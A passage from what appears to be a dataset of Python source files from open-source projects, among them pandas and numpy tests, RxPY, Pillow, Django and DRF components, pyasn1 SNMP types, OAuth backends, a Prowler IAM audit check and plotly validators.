        self._check_setitem_invalid(arr, invalid)

    @pytest.mark.parametrize(""invalid"", _invalid_scalars + [True, 1.5, np.float64(1.5)])
    def test_setitem_validation_scalar_int(self, invalid, any_int_ea_dtype):
        arr = pd.array([1, 2, None], dtype=any_int_ea_dtype)
        self._check_setitem_invalid(arr, invalid)

    @pytest.mark.parametrize(""invalid"", _invalid_scalars + [True])
    def test_setitem_validation_scalar_float(self, invalid, float_ea_dtype):
        arr = pd.array([1, 2, None], dtype=float_ea_dtype)
        self._check_setitem_invalid(arr, invalid)"
JY336	JY336-timeoutscheduler.py	"import logging
from threading import Timer
from datetime import timedelta

from rx.core import Scheduler, Disposable
from rx.disposables import SingleAssignmentDisposable, CompositeDisposable

from .schedulerbase import SchedulerBase

log = logging.getLogger(""Rx"")


class TimeoutScheduler(SchedulerBase):
    """"""A scheduler that schedules work via a timed callback based upon platform.""""""

    def schedule(self, action, state=None):
        """"""Schedules an action to be executed.""""""

        disposable = SingleAssignmentDisposable()

        def interval():
            disposable.disposable = self.invoke_action(action, state)
        timer = Timer(0, interval)
        timer.setDaemon(True)
        timer.start()

        def dispose():
            timer.cancel()
        return CompositeDisposable(disposable, Disposable.create(dispose))

    def schedule_relative(self, duetime, action, state=None):
        """"""Schedules an action to be executed after duetime.""""""

        scheduler = self
        timespan = self.to_timedelta(duetime)
        if timespan == timedelta(0):
            return scheduler.schedule(action, state)

        disposable = SingleAssignmentDisposable()

        def interval():
            disposable.disposable = self.invoke_action(action, state)

        seconds = timespan.total_seconds()
        log.debug(""timeout: %s"", seconds)
        timer = Timer(seconds, interval)
        timer.setDaemon(True)
        timer.start()

        def dispose():
            timer.cancel()

        return CompositeDisposable(disposable, Disposable.create(dispose))

    def schedule_absolute(self, duetime, action, state=None):
        """"""Schedules an action to be executed after duetime.""""""

        duetime = self.to_datetime(duetime)
        return self.schedule_relative(duetime - self.now, action, state)

    def _start_timer(self, period, action):
        timer = Timer(period, action)
        timer.setDaemon(True)
        timer.start()

        return timer


Scheduler.timeout = timeout_scheduler = TimeoutScheduler()"
JY550	JY550-test_matrix_linalg.py	""""""" Test functions for linalg module using the matrix class.""""""
import numpy as np

from numpy.linalg.tests.test_linalg import (
    LinalgCase, apply_tag, TestQR as _TestQR, LinalgTestCase,
    _TestNorm2D, _TestNormDoubleBase, _TestNormSingleBase, _TestNormInt64Base,
    SolveCases, InvCases, EigvalsCases, EigCases, SVDCases, CondCases,
    PinvCases, DetCases, LstsqCases)


CASES = []

# square test cases
CASES += apply_tag('square', [
    LinalgCase(""0x0_matrix"",
               np.empty((0, 0), dtype=np.double).view(np.matrix),
               np.empty((0, 1), dtype=np.double).view(np.matrix),
               tags={'size-0'}),
    LinalgCase(""matrix_b_only"",
               np.array([[1., 2.], [3., 4.]]),
               np.matrix([2., 1.]).T),
    LinalgCase(""matrix_a_and_b"",
               np.matrix([[1., 2.], [3., 4.]]),
               np.matrix([2., 1.]).T),
])

# hermitian test-cases
CASES += apply_tag('hermitian', [
    LinalgCase(""hmatrix_a_and_b"",
               np.matrix([[1., 2.], [2., 1.]]),
               None),
])
# No need to make generalized or strided cases for matrices.


class MatrixTestCase(LinalgTestCase):
    TEST_CASES = CASES


class TestSolveMatrix(SolveCases, MatrixTestCase):
    pass


class TestInvMatrix(InvCases, MatrixTestCase):
    pass


class TestEigvalsMatrix(EigvalsCases, MatrixTestCase):
    pass


class TestEigMatrix(EigCases, MatrixTestCase):
    pass


class TestSVDMatrix(SVDCases, MatrixTestCase):
    pass


class TestCondMatrix(CondCases, MatrixTestCase):
    pass


class TestPinvMatrix(PinvCases, MatrixTestCase):
    pass


class TestDetMatrix(DetCases, MatrixTestCase):
    pass


class TestLstsqMatrix(LstsqCases, MatrixTestCase):
    pass


class _TestNorm2DMatrix(_TestNorm2D):
    array = np.matrix


class TestNormDoubleMatrix(_TestNorm2DMatrix, _TestNormDoubleBase):
    pass


class TestNormSingleMatrix(_TestNorm2DMatrix, _TestNormSingleBase):
    pass


class TestNormInt64Matrix(_TestNorm2DMatrix, _TestNormInt64Base):
    pass


class TestQRMatrix(_TestQR):
    array = np.matrix"
JD412	JD412-_deprecate.py	"from __future__ import annotations

import warnings

from . import __version__


def deprecate(
    deprecated: str,
    when: int | None,
    replacement: str | None = None,
    *,
    action: str | None = None,
    plural: bool = False,
) -> None:
    """"""
    Deprecations helper.

    :param deprecated: Name of thing to be deprecated.
    :param when: Pillow major version to be removed in.
    :param replacement: Name of replacement.
    :param action: Instead of ""replacement"", give a custom call to action
        e.g. ""Upgrade to new thing"".
    :param plural: if the deprecated thing is plural, needing ""are"" instead of ""is"".

    Usually of the form:

        ""[deprecated] is deprecated and will be removed in Pillow [when] (yyyy-mm-dd).
        Use [replacement] instead.""

    You can leave out the replacement sentence:

        ""[deprecated] is deprecated and will be removed in Pillow [when] (yyyy-mm-dd)""

    Or with another call to action:

        ""[deprecated] is deprecated and will be removed in Pillow [when] (yyyy-mm-dd).
        [action].""
    """"""

    is_ = ""are"" if plural else ""is""

    if when is None:
        removed = ""a future version""
    elif when <= int(__version__.split(""."")[0]):
        msg = f""{deprecated} {is_} deprecated and should be removed.""
        raise RuntimeError(msg)
    elif when == 10:
        removed = ""Pillow 10 (2023-07-01)""
    else:
        msg = f""Unknown removal version, update {__name__}?""
        raise ValueError(msg)

    if replacement and action:
        msg = ""Use only one of 'replacement' and 'action'""
        raise ValueError(msg)

    if replacement:
        action = f"". Use {replacement} instead.""
    elif action:
        action = f"". {action.rstrip('.')}.""
    else:
        action = """"

    warnings.warn(
        f""{deprecated} {is_} deprecated and will be removed in {removed}{action}"",
        DeprecationWarning,
        stacklevel=3,
    )"
JD257	JD257-config_txn.py	"#
# Copyright 2017 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

class ClosedTransactionError(Exception):
    pass


class ConfigTransaction(object):

    __slots__ = (
        '_proxy',
        '_txid'
    )

    def __init__(self, proxy, txid):
        self._proxy = proxy
        self._txid = txid

    def __del__(self):
        if self._txid:
            try:
                self.cancel()
            except:
                raise

    # ~~~~~~~~~~~~~~~~~~~~ CRUD ops within the transaction ~~~~~~~~~~~~~~~~~~~~

    def get(self, path='/', depth=None, deep=None):
        if self._txid is None:
            raise ClosedTransactionError()
        return self._proxy.get(path, depth=depth, deep=deep, txid=self._txid)

    def update(self, path, data, strict=False):
        if self._txid is None:
            raise ClosedTransactionError()
        return self._proxy.update(path, data, strict, self._txid)

    def add(self, path, data):
        if self._txid is None:
            raise ClosedTransactionError()
        return self._proxy.add(path, data, self._txid)

    def remove(self, path):
        if self._txid is None:
            raise ClosedTransactionError()
        return self._proxy.remove(path, self._txid)

    # ~~~~~~~~~~~~~~~~~~~~ transaction finalization ~~~~~~~~~~~~~~~~~~~~~~~~~~~

    def cancel(self):
        """"""Explicitly cancel the transaction""""""
        self._proxy.cancel_transaction(self._txid)
        self._txid = None

    def commit(self):
        """"""Commit all transaction changes""""""
        try:
            self._proxy.commit_transaction(self._txid)
        finally:
            self._txid = None"
JY475	JY475-test_comparison.py	"import numpy as np
import pytest

import pandas as pd
import pandas._testing as tm
from pandas.arrays import BooleanArray
from pandas.tests.arrays.masked_shared import ComparisonOps


@pytest.fixture
def data():
    """"""Fixture returning boolean array with valid and missing data""""""
    return pd.array(
        [True, False] * 4 + [np.nan] + [True, False] * 44 + [np.nan] + [True, False],
        dtype=""boolean"",
    )


@pytest.fixture
def dtype():
    """"""Fixture returning BooleanDtype""""""
    return pd.BooleanDtype()


class TestComparisonOps(ComparisonOps):
    def test_compare_scalar(self, data, comparison_op):
        self._compare_other(data, comparison_op, True)

    def test_compare_array(self, data, comparison_op):
        other = pd.array([True] * len(data), dtype=""boolean"")
        self._compare_other(data, comparison_op, other)
        other = np.array([True] * len(data))
        self._compare_other(data, comparison_op, other)
        other = pd.Series([True] * len(data))
        self._compare_other(data, comparison_op, other)

    @pytest.mark.parametrize(""other"", [True, False, pd.NA])
    def test_scalar(self, other, comparison_op, dtype):
        ComparisonOps.test_scalar(self, other, comparison_op, dtype)

    def test_array(self, comparison_op):
        op = comparison_op
        a = pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")
        b = pd.array([True, False, None] * 3, dtype=""boolean"")

        result = op(a, b)

        values = op(a._data, b._data)
        mask = a._mask | b._mask
        expected = BooleanArray(values, mask)
        tm.assert_extension_array_equal(result, expected)

        # ensure we haven't mutated anything inplace
        result[0] = None
        tm.assert_extension_array_equal(
            a, pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")
        )
        tm.assert_extension_array_equal(
            b, pd.array([True, False, None] * 3, dtype=""boolean"")
        )"
JY93	JY93-runjob.py	"# -*- coding: utf-8 -*-
import logging

from django.core.management.base import BaseCommand

from django_extensions.management.jobs import get_job, print_jobs
from django_extensions.management.utils import setup_logger, signalcommand

logger = logging.getLogger(__name__)


class Command(BaseCommand):
    help = ""Run a single maintenance job.""
    missing_args_message = ""test""

    def add_arguments(self, parser):
        super().add_arguments(parser)
        parser.add_argument('app_name', nargs='?')
        parser.add_argument('job_name', nargs='?')
        parser.add_argument(
            '--list', '-l', action=""store_true"", dest=""list_jobs"",
            default=False, help=""List all jobs with their description""
        )

    def runjob(self, app_name, job_name, options):
        verbosity = options[""verbosity""]
        if verbosity > 1:
            logger.info(""Executing job: %s (app: %s)"", job_name, app_name)
        try:
            job = get_job(app_name, job_name)
        except KeyError:
            if app_name:
                logger.error(""Error: Job %s for applabel %s not found"", job_name, app_name)
            else:
                logger.error(""Error: Job %s not found"", job_name)
            logger.info(""Use -l option to view all the available jobs"")
            return
        try:
            job().execute()
        except Exception:
            logger.exception(""ERROR OCCURED IN JOB: %s (APP: %s)"", job_name, app_name)

    @signalcommand
    def handle(self, *args, **options):
        app_name = options['app_name']
        job_name = options['job_name']

        # hack since we are using job_name nargs='?' for -l to work
        if app_name and not job_name:
            job_name = app_name
            app_name = None

        setup_logger(logger, self.stdout)

        if options['list_jobs']:
            print_jobs(only_scheduled=False, show_when=True, show_appname=True)
        else:
            self.runjob(app_name, job_name, options)"
JY76	JY76-views.py	"""""""
views.py        # Houses `SchemaView`, `APIView` subclass.

See schemas.__init__.py for package overview.
""""""
from rest_framework import exceptions, renderers
from rest_framework.response import Response
from rest_framework.schemas import coreapi
from rest_framework.settings import api_settings
from rest_framework.views import APIView


class SchemaView(APIView):
    _ignore_model_permissions = True
    schema = None  # exclude from schema
    renderer_classes = None
    schema_generator = None
    public = False

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        if self.renderer_classes is None:
            if coreapi.is_enabled():
                self.renderer_classes = [
                    renderers.CoreAPIOpenAPIRenderer,
                    renderers.CoreJSONRenderer,
                ]
            else:
                self.renderer_classes = [
                    renderers.OpenAPIRenderer,
                    renderers.JSONOpenAPIRenderer,
                ]
            if renderers.BrowsableAPIRenderer in api_settings.DEFAULT_RENDERER_CLASSES:
                self.renderer_classes += [renderers.BrowsableAPIRenderer]

    def get(self, request, *args, **kwargs):
        schema = self.schema_generator.get_schema(request, self.public)
        if schema is None:
            raise exceptions.PermissionDenied()
        return Response(schema)

    def handle_exception(self, exc):
        # Schema renderers do not render exceptions, so re-perform content
        # negotiation with default renderers.
        self.renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES
        neg = self.perform_content_negotiation(self.request, force=True)
        self.request.accepted_renderer, self.request.accepted_media_type = neg
        return super().handle_exception(exc)"
JY261	JY261-setup.py	"#! /usr/bin/env python3

import os

try:
    from setuptools import find_packages, setup
except AttributeError:
    from setuptools import find_packages, setup

NAME = 'wofrysrw'
VERSION = '1.1.24'
ISRELEASED = True

DESCRIPTION = 'WOFRY for SRW library'
README_FILE = os.path.join(os.path.dirname(__file__), 'README.md')
LONG_DESCRIPTION = open(README_FILE).read()
AUTHOR = 'Luca Rebuffi'
AUTHOR_EMAIL = 'lrebuffi@anl.gov'
URL = 'https://github.com/lucarebuffi/wofrysrw'
DOWNLOAD_URL = 'https://github.com/lucarebuffi/wofrysrw'
LICENSE = 'GPLv3'

KEYWORDS = (
    'dictionary',
    'glossary',
    'synchrotron'
    'simulation',
)

CLASSIFIERS = (
    'Development Status :: 4 - Beta',
    'Environment :: X11 Applications :: Qt',
    'Environment :: Console',
    'Environment :: Plugins',
    'Programming Language :: Python :: 3',
    'Intended Audience :: Science/Research',
)

SETUP_REQUIRES = (
    'setuptools',
)

INSTALL_REQUIRES = (
    'setuptools',
    'numpy',
    'scipy',
    'syned>=1.0.26',
    'wofry>=1.0.31',
    'oasys-srwpy>=1.0.5'
)

PACKAGES = [
    ""wofrysrw"",
]

PACKAGE_DATA = {}

if __name__ == '__main__':
    try:
        import PyMca5, PyQt4

        raise NotImplementedError(""This version of wofrysrw doesn't work with Oasys1 beta.\nPlease install OASYS1 final release: https://www.aps.anl.gov/Science/Scientific-Software/OASYS"")
    except:
        setup(
              name = NAME,
              version = VERSION,
              description = DESCRIPTION,
              long_description = LONG_DESCRIPTION,
              author = AUTHOR,
              author_email = AUTHOR_EMAIL,
              url = URL,
              download_url = DOWNLOAD_URL,
              license = LICENSE,
              keywords = KEYWORDS,
              classifiers = CLASSIFIERS,
              packages = PACKAGES,
              package_data = PACKAGE_DATA,
              setup_requires = SETUP_REQUIRES,
              install_requires = INSTALL_REQUIRES,
              include_package_data = True,
              zip_safe = False,
              )"
JD77	JD77-rfc3412.py	"#
# This file is part of pyasn1-modules software.
#
# Copyright (c) 2005-2019, Ilya Etingof <etingof@gmail.com>
# License: http://snmplabs.com/pyasn1/license.html
#
# SNMPv3 message syntax
#
# ASN.1 source from:
# http://www.ietf.org/rfc/rfc3412.txt
#
from pyasn1.type import constraint
from pyasn1.type import namedtype
from pyasn1.type import univ

from pyasn1_modules import rfc1905


class ScopedPDU(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('contextEngineId', univ.OctetString()),
        namedtype.NamedType('contextName', univ.OctetString()),
        namedtype.NamedType('data', rfc1905.PDUs())
    )


class ScopedPduData(univ.Choice):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('plaintext', ScopedPDU()),
        namedtype.NamedType('encryptedPDU', univ.OctetString()),
    )


class HeaderData(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('msgID',
                            univ.Integer().subtype(subtypeSpec=constraint.ValueRangeConstraint(0, 2147483647))),
        namedtype.NamedType('msgMaxSize',
                            univ.Integer().subtype(subtypeSpec=constraint.ValueRangeConstraint(484, 2147483647))),
        namedtype.NamedType('msgFlags', univ.OctetString().subtype(subtypeSpec=constraint.ValueSizeConstraint(1, 1))),
        namedtype.NamedType('msgSecurityModel',
                            univ.Integer().subtype(subtypeSpec=constraint.ValueRangeConstraint(1, 2147483647)))
    )


class SNMPv3Message(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('msgVersion',
                            univ.Integer().subtype(subtypeSpec=constraint.ValueRangeConstraint(0, 2147483647))),
        namedtype.NamedType('msgGlobalData', HeaderData()),
        namedtype.NamedType('msgSecurityParameters', univ.OctetString()),
        namedtype.NamedType('msgData', ScopedPduData())
    )"
JD191	JD191-_exceptions.py	"from ._common import pytz_imported


class PytzUsageWarning(RuntimeWarning):
    """"""Warning raised when accessing features specific to ``pytz``'s interface.

    This warning is used to direct users of ``pytz``-specific features like the
    ``localize`` and ``normalize`` methods towards using the standard
    ``tzinfo`` interface, so that these shims can be replaced with one of the
    underlying libraries they are wrapping.
    """"""


class UnknownTimeZoneError(KeyError):
    """"""Raised when no time zone is found for a specified key.""""""


class InvalidTimeError(Exception):
    """"""The base class for exceptions related to folds and gaps.""""""


class AmbiguousTimeError(InvalidTimeError):
    """"""Exception raised when ``is_dst=None`` for an ambiguous time (fold).""""""


class NonExistentTimeError(InvalidTimeError):
    """"""Exception raised when ``is_dst=None`` for a non-existent time (gap).""""""


PYTZ_BASE_ERROR_MAPPING = {}


def _make_pytz_derived_errors(
    InvalidTimeError_=InvalidTimeError,
    AmbiguousTimeError_=AmbiguousTimeError,
    NonExistentTimeError_=NonExistentTimeError,
    UnknownTimeZoneError_=UnknownTimeZoneError,
):
    if PYTZ_BASE_ERROR_MAPPING or not pytz_imported():
        return

    import pytz

    class InvalidTimeError(InvalidTimeError_, pytz.InvalidTimeError):
        pass

    class AmbiguousTimeError(AmbiguousTimeError_, pytz.AmbiguousTimeError):
        pass

    class NonExistentTimeError(
        NonExistentTimeError_, pytz.NonExistentTimeError
    ):
        pass

    class UnknownTimeZoneError(
        UnknownTimeZoneError_, pytz.UnknownTimeZoneError
    ):
        pass

    PYTZ_BASE_ERROR_MAPPING.update(
        {
            InvalidTimeError_: InvalidTimeError,
            AmbiguousTimeError_: AmbiguousTimeError,
            NonExistentTimeError_: NonExistentTimeError,
            UnknownTimeZoneError_: UnknownTimeZoneError,
        }
    )


def get_exception(exc_type, msg):
    _make_pytz_derived_errors()

    out_exc_type = PYTZ_BASE_ERROR_MAPPING.get(exc_type, exc_type)

    return out_exc_type(msg)"
JD338	JD338-douban.py	"""""""
Douban OAuth1 and OAuth2 backends, docs at:
    https://python-social-auth.readthedocs.io/en/latest/backends/douban.html
""""""
from .oauth import BaseOAuth1, BaseOAuth2


class DoubanOAuth(BaseOAuth1):
    """"""Douban OAuth authentication backend""""""
    name = 'douban'
    EXTRA_DATA = [('id', 'id')]
    AUTHORIZATION_URL = 'http://www.douban.com/service/auth/authorize'
    REQUEST_TOKEN_URL = 'http://www.douban.com/service/auth/request_token'
    ACCESS_TOKEN_URL = 'http://www.douban.com/service/auth/access_token'

    def get_user_id(self, details, response):
        return response['db:uid']['$t']

    def get_user_details(self, response):
        """"""Return user details from Douban""""""
        return {'username': response['db:uid']['$t'],
                'email': ''}

    def user_data(self, access_token, *args, **kwargs):
        """"""Return user data provided""""""
        return self.get_json('http://api.douban.com/people/%40me?&alt=json',
                             auth=self.oauth_auth(access_token))


class DoubanOAuth2(BaseOAuth2):
    """"""Douban OAuth authentication backend""""""
    name = 'douban-oauth2'
    AUTHORIZATION_URL = 'https://www.douban.com/service/auth2/auth'
    ACCESS_TOKEN_URL = 'https://www.douban.com/service/auth2/token'
    ACCESS_TOKEN_METHOD = 'POST'
    REDIRECT_STATE = False
    EXTRA_DATA = [
        ('id', 'id'),
        ('uid', 'username'),
        ('refresh_token', 'refresh_token'),
    ]

    def get_user_details(self, response):
        """"""Return user details from Douban""""""
        fullname, first_name, last_name = self.get_user_names(
            response.get('name', '')
        )
        return {'username': response.get('uid', ''),
                'fullname': fullname,
                'first_name': first_name,
                'last_name': last_name,
                'email': ''}

    def user_data(self, access_token, *args, **kwargs):
        """"""Return user data provided""""""
        return self.get_json(
            'https://api.douban.com/v2/user/~me',
            headers={'Authorization': f'Bearer {access_token}'}
        )"
JY218	JY218-middleware.py	"from django.apps import apps
from django.conf import settings
from django.contrib.redirects.models import Redirect
from django.contrib.sites.shortcuts import get_current_site
from django.core.exceptions import ImproperlyConfigured
from django.http import HttpResponseGone, HttpResponsePermanentRedirect
from django.utils.deprecation import MiddlewareMixin


class RedirectFallbackMiddleware(MiddlewareMixin):
    # Defined as class-level attributes to be subclassing-friendly.
    response_gone_class = HttpResponseGone
    response_redirect_class = HttpResponsePermanentRedirect

    def __init__(self, get_response):
        if not apps.is_installed(""django.contrib.sites""):
            raise ImproperlyConfigured(
                ""You cannot use RedirectFallbackMiddleware when ""
                ""django.contrib.sites is not installed.""
            )
        super().__init__(get_response)

    def process_response(self, request, response):
        # No need to check for a redirect for non-404 responses.
        if response.status_code != 404:
            return response

        full_path = request.get_full_path()
        current_site = get_current_site(request)

        r = None
        try:
            r = Redirect.objects.get(site=current_site, old_path=full_path)
        except Redirect.DoesNotExist:
            pass
        if r is None and settings.APPEND_SLASH and not request.path.endswith(""/""):
            try:
                r = Redirect.objects.get(
                    site=current_site,
                    old_path=request.get_full_path(force_append_slash=True),
                )
            except Redirect.DoesNotExist:
                pass
        if r is not None:
            if r.new_path == """":
                return self.response_gone_class()
            return self.response_redirect_class(r.new_path)

        # No redirect was found. Return the response.
        return response"
JD241	JD241-test_comparison.py	"import numpy as np
import pytest

import pandas as pd
import pandas._testing as tm
from pandas.arrays import BooleanArray
from pandas.tests.arrays.masked_shared import ComparisonOps


@pytest.fixture
def data():
    """"""Fixture returning boolean array with valid and missing data""""""
    return pd.array(
        [True, False] * 4 + [np.nan] + [True, False] * 44 + [np.nan] + [True, False],
        dtype=""boolean"",
    )


@pytest.fixture
def dtype():
    """"""Fixture returning BooleanDtype""""""
    return pd.BooleanDtype()


class TestComparisonOps(ComparisonOps):
    def test_compare_scalar(self, data, comparison_op):
        self._compare_other(data, comparison_op, True)

    def test_compare_array(self, data, comparison_op):
        other = pd.array([True] * len(data), dtype=""boolean"")
        self._compare_other(data, comparison_op, other)
        other = np.array([True] * len(data))
        self._compare_other(data, comparison_op, other)
        other = pd.Series([True] * len(data))
        self._compare_other(data, comparison_op, other)

    @pytest.mark.parametrize(""other"", [True, False, pd.NA])
    def test_scalar(self, other, comparison_op, dtype):
        ComparisonOps.test_scalar(self, other, comparison_op, dtype)

    def test_array(self, comparison_op):
        op = comparison_op
        a = pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")
        b = pd.array([True, False, None] * 3, dtype=""boolean"")

        result = op(a, b)

        values = op(a._data, b._data)
        mask = a._mask | b._mask
        expected = BooleanArray(values, mask)
        tm.assert_extension_array_equal(result, expected)

        # ensure we haven't mutated anything inplace
        result[0] = None
        tm.assert_extension_array_equal(
            a, pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")
        )
        tm.assert_extension_array_equal(
            b, pd.array([True, False, None] * 3, dtype=""boolean"")
        )"
JD352	JD352-iam_administrator_access_with_mfa.py	"from prowler.lib.check.models import Check, Check_Report_AWS
from prowler.providers.aws.services.iam.iam_client import iam_client


class iam_administrator_access_with_mfa(Check):
    def execute(self) -> Check_Report_AWS:
        findings = []
        response = iam_client.groups

        for group in response:
            report = Check_Report_AWS(self.metadata())
            report.resource_id = group.name
            report.resource_arn = group.arn
            report.region = iam_client.region
            report.status = ""PASS""
            report.status_extended = f""Group {group.name} has no policies.""

            if group.attached_policies:
                report.status_extended = (
                    f""Group {group.name} provides non-administrative access.""
                )
                for group_policy in group.attached_policies:
                    if (
                        group_policy[""PolicyArn""]
                        == ""arn:aws:iam::aws:policy/AdministratorAccess""
                    ):
                        # users in group are Administrators
                        if group.users:
                            for group_user in group.users:
                                for user in iam_client.credential_report:
                                    if (
                                        user[""user""] == group_user.name
                                        and user[""mfa_active""] == ""false""
                                    ):
                                        report.status = ""FAIL""
                                        report.status_extended = f""Group {group.name} provides administrator access to User {group_user.name} with MFA disabled.""
                        else:
                            report.status_extended = f""Group {group.name} provides administrative access but does not have users.""

            findings.append(report)

        return findings"
JY470	JY470-test__version.py	"""""""Tests for the NumpyVersion class.

""""""
from numpy.testing import assert_, assert_raises
from numpy.lib import NumpyVersion


def test_main_versions():
    assert_(NumpyVersion('1.8.0') == '1.8.0')
    for ver in ['1.9.0', '2.0.0', '1.8.1', '10.0.1']:
        assert_(NumpyVersion('1.8.0') < ver)

    for ver in ['1.7.0', '1.7.1', '0.9.9']:
        assert_(NumpyVersion('1.8.0') > ver)


def test_version_1_point_10():
    # regression test for gh-2998.
    assert_(NumpyVersion('1.9.0') < '1.10.0')
    assert_(NumpyVersion('1.11.0') < '1.11.1')
    assert_(NumpyVersion('1.11.0') == '1.11.0')
    assert_(NumpyVersion('1.99.11') < '1.99.12')


def test_alpha_beta_rc():
    assert_(NumpyVersion('1.8.0rc1') == '1.8.0rc1')
    for ver in ['1.8.0', '1.8.0rc2']:
        assert_(NumpyVersion('1.8.0rc1') < ver)

    for ver in ['1.8.0a2', '1.8.0b3', '1.7.2rc4']:
        assert_(NumpyVersion('1.8.0rc1') > ver)

    assert_(NumpyVersion('1.8.0b1') > '1.8.0a2')


def test_dev_version():
    assert_(NumpyVersion('1.9.0.dev-Unknown') < '1.9.0')
    for ver in ['1.9.0', '1.9.0a1', '1.9.0b2', '1.9.0b2.dev-ffffffff']:
        assert_(NumpyVersion('1.9.0.dev-f16acvda') < ver)

    assert_(NumpyVersion('1.9.0.dev-f16acvda') == '1.9.0.dev-11111111')


def test_dev_a_b_rc_mixed():
    assert_(NumpyVersion('1.9.0a2.dev-f16acvda') == '1.9.0a2.dev-11111111')
    assert_(NumpyVersion('1.9.0a2.dev-6acvda54') < '1.9.0a2')


def test_dev0_version():
    assert_(NumpyVersion('1.9.0.dev0+Unknown') < '1.9.0')
    for ver in ['1.9.0', '1.9.0a1', '1.9.0b2', '1.9.0b2.dev0+ffffffff']:
        assert_(NumpyVersion('1.9.0.dev0+f16acvda') < ver)

    assert_(NumpyVersion('1.9.0.dev0+f16acvda') == '1.9.0.dev0+11111111')


def test_dev0_a_b_rc_mixed():
    assert_(NumpyVersion('1.9.0a2.dev0+f16acvda') == '1.9.0a2.dev0+11111111')
    assert_(NumpyVersion('1.9.0a2.dev0+6acvda54') < '1.9.0a2')


def test_raises():
    for ver in ['1.9', '1,9.0', '1.7.x']:
        assert_raises(ValueError, NumpyVersion, ver)"
JY368	JY368-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""funnel.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY517	JY517-pivot.py	"from __future__ import absolute_import
# Copyright (c) 2010-2021 openpyxl

from openpyxl.descriptors.serialisable import Serialisable
from openpyxl.descriptors import (
    Alias,
    Typed,
)
from openpyxl.descriptors.nested import NestedInteger, NestedText
from openpyxl.descriptors.excel import ExtensionList

from .label import DataLabel
from .marker import Marker
from .shapes import GraphicalProperties
from .text import RichText


class PivotSource(Serialisable):

    tagname = ""pivotSource""

    name = NestedText(expected_type=str)
    fmtId = NestedInteger(expected_type=int)
    extLst = Typed(expected_type=ExtensionList, allow_none=True)

    __elements__ = ('name', 'fmtId')

    def __init__(self,
                 name=None,
                 fmtId=None,
                 extLst=None,
                ):
        self.name = name
        self.fmtId = fmtId


class PivotFormat(Serialisable):

    tagname = ""pivotFmt""

    idx = NestedInteger(nested=True)
    spPr = Typed(expected_type=GraphicalProperties, allow_none=True)
    graphicalProperties = Alias(""spPr"")
    txPr = Typed(expected_type=RichText, allow_none=True)
    TextBody = Alias(""txPr"")
    marker = Typed(expected_type=Marker, allow_none=True)
    dLbl = Typed(expected_type=DataLabel, allow_none=True)
    DataLabel = Alias(""dLbl"")
    extLst = Typed(expected_type=ExtensionList, allow_none=True)

    __elements__ = ('idx', 'spPr', 'txPr', 'marker', 'dLbl')

    def __init__(self,
                 idx=0,
                 spPr=None,
                 txPr=None,
                 marker=None,
                 dLbl=None,
                 extLst=None,
                ):
        self.idx = idx
        self.spPr = spPr
        self.txPr = txPr
        self.marker = marker
        self.dLbl = dLbl"
JY369	JY369-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""histogram.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD120	JD120-test_aio_websocket.py	"import os
import asyncio
import pytest

import txaio

# because py.test tries to collect it as a test-case
from unittest.mock import Mock

from autobahn.asyncio.websocket import WebSocketServerFactory


